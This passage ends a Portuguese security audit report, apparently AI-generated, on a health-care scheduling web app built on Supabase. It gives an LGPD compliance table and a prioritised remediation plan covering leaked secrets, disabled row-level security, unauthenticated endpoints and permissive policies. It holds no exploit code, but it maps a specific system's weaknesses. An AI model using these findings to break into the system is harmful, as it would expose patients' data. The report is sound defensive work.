| Retenção/eliminação (Art. 15/16) | 🟡 | Só CCO tem retenção; demais indefinido |
| Rastreabilidade/accountability | 🟠 | Credencial de quiosque compartilhada (M6); `audit_logs.user_id` virou nullable |
| Notificação de incidente (Art. 48) | ⚠️ | Se as chaves de C1 foram acessadas por terceiros, avaliar dever de notificar a ANPD/titulares |

---

## 11. PLANO DE AÇÃO

### 🔴 Imediatas (hoje / 24–48h) — bloqueadores
1. **Rotacionar** a JWT secret/service_role da Supabase **e** a senha ASSIM (C1). Atualizar `NEXT_PUBLIC_SUPABASE_ANON_KEY` no deploy.
2. **Reabilitar RLS em `usuarios`** + revogar grants de `anon` + repor policies (C2, C3).
3. **Remover `role` da metadata** em `handle_new_user`; no Dashboard, desligar signup público e exigir confirmação de e-mail (C4).
4. **Deletar do deploy** `cco-test-setup`, `tita-compare-endpoints`, `test_env`, `cco-conciliation-engine-test` e o `.backup` (C5, A8).
5. **Adicionar auth+RBAC** (ou `X-CRON-SECRET`) em `get-grade-csv`, `sync-grade-csv`, `sync_tita_grade`, `sync_tita_agenda`, `fila-validacao`, `controle-terapeutico-upsert` (C6, A5, A6).
6. **Dropar as políticas `USING(true)`** de `autorizacoes`, `chamada_paciente`, `sync_controle` (C7).
7. Rodar a **§2 Verificação Imediata** para confirmar o estado real de produção.

### 🟠 Importantes (1–2 semanas)
8. `security_invoker=true` + `REVOKE anon` nas views; `REVOKE anon` na RPC `get_dashboard_kpis` (A1, A2).
9. Escopar por papel as tabelas `agenda_*`, `grade_profissionais_tita`, `csv_grades_profissionais`, `substituicoes_historico`, `saida_aceites`, `acomp_*`; checar papel em `get_cco_atendimentos` (A3, M3).
10. Remover a rota Next órfã `guias-digitais/processar` (ou aplicar RBAC + client do usuário) e nunca retornar `carimbo_digital` (A4).
11. Migrar `xlsx` para ≥0.20.2/`exceljs`; sanitizar exports CSV; validar tamanho/tipo de uploads (A9, A10, M4, M5).
12. Proteger `/tv` com token de dispositivo; endurecer login (sem enumeração) (A7, A11).
13. Rate limiting com store compartilhado + validação de `role`/entrada nas rotas restantes; parar de vazar `error.message` (M9, M11, M12).
14. Commitar lockfile + `npm ci`; `USER node`; corrigir CSP (M10, M14).

### 🔵 Melhorias futuras (1–2 meses)
15. Contas por terapeuta no fluxo de disponibilidade (M6); timeout de sessão (B7).
16. Defesa em profundidade nas rotas `central/*` (checagem de org na aplicação) + testes cross-org (M2).
17. Projetar seguro o webhook WhatsApp (HMAC, org do servidor) e o worker de mídia (anti-SSRF) **antes** de construí-los (L1, L2); auditar buckets de Storage (L3).
18. `git filter-repo`/BFG para limpar segredos e PII do histórico; remover `robo-autorizador/` e `.temp/*` do tracking (B3).
19. Política de retenção LGPD + trilha de acesso a PHI; limpar logs de PII/segredos (C6, M13, B7).

---

*Relatório gerado por auditoria multi-agente (RLS/banco, APIs, Edge Functions, auth/frontend, secrets/config/deps, integrações/upload). Achados de banco derivam do histórico de migrations — confirmar o estado efetivo em produção (§2).*
